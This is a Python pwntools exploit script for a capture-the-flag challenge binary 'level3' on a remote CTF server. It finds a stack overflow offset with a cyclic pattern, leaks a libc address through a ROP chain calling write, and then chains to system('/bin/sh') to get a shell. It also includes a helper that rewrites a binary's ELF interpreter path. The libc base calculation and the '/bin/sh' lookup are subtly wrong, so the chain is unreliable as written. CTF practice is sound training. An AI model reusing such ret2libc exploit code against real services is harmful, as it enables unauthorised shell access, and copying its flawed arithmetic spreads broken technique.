from pwn import *

context.arch = "i386"
context.terminal = ['tmux', 'splitw', '-h']




def change_ld(binary, ld):
        """
        Force to use assigned new ld.so by changing the binary
        """
        if not os.access(ld, os.R_OK): 
            log.failure("Invalid path {} to ld".format(ld))
            return None
        
        if not isinstance(binary, ELF):
            if not os.access(binary, os.R_OK): 
                    log.failure("Invalid path {} to binary".format(binary))
                    return None
            binary = ELF(binary)

        for segment in binary.segments:
            if segment.header['p_type'] == 'PT_INTERP':
                size = segment.header['p_memsz']
                addr = segment.header['p_paddr']
                data = segment.data()
                if size <= len(ld):
                    log.failure("Failed to change PT_INTERP from {} to {}".format(data, ld))
                    return None
                binary.write(addr, ld.ljust(size, '\0'))
                if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn')
                path = '/tmp/pwn/{}_debug'.format(os.path.basename(binary.path))
                if os.access(path, os.F_OK): 
                    os.remove(path)
                    info("Removing exist file {}".format(path))
                binary.save(path)    
                os.chmod(path, 0b111000000) #rwx------
        success("PT_INTERP has changed from {} to {}. Using temp file {}".format(data, ld, path)) 
        return ELF(path)
                                         

class Pwn(object):

    def __init__(self, binary_file=None, remote=None):
        self.remote_sign = False
        if binary_file:
            self.binary_file = binary_file
   
        if remote:
            self.host = remote['host']
            self.port = remote['port']
            self.remote_sign = True


    def get_overflow_position(self):
        io = self.get_io()
        io.recvline()
        # io.recvall()
        io.send(cyclic(500))
        io.recvall()

        if os.path.isfile('./core'):
            core = Core('./core')
            self.eip = cyclic_find(p32(core.eip))
            print 'eip:', hex(self.eip)


    def get_io(self):
        io = None
        if self.remote_sign:
            io = remote(self.host, self.port)
        else:
            io = process([self.binary_file], env={"LD_PRELOAD":"./libc-2.19.so"})
        return io

    
    def get_shell(self):
        # elf = change_ld('./level3', './ld.so')
        # io = elf.process(env={'LD_PRELOAD':'./libc.so.6'})
        # io = process([self.binary_file], env={"LD_PRELOAD":"./libc-2.19.so"})
        io = self.get_io()
        io.recvline()
        elf = ELF('./level3')
        write_got = elf.got['write']
        libc = ELF('./libc.so.6')
        write_plt = libc.symbols['write']

        rop = ROP('./level3')
        rop.write(1, write_got, 4)
        rop.main()

        io.send(fit({self.eip: rop.chain()}))
        write_got_addr = io.unpack()
        libc.address = write_plt - write_got

        bin_addr = libc.search('/bin/sh\x00')
        
        rop = ROP(libc)
        rop.system(bin_addr)
        io.send(fit({self.eip:rop.chain()}))

        io.recvline()
        # gdb.attach(io)

        # io.send(payload)
        # io.interactive()


def main():
    # pwn = Pwn(binary_file='./level3')
    pwn = Pwn(remote={'host':'pwn2.jarvisoj.com', 'port':9879})
    pwn.get_overflow_position()
    # pwn.get_shell()


if __name__ == "__main__":
    main()

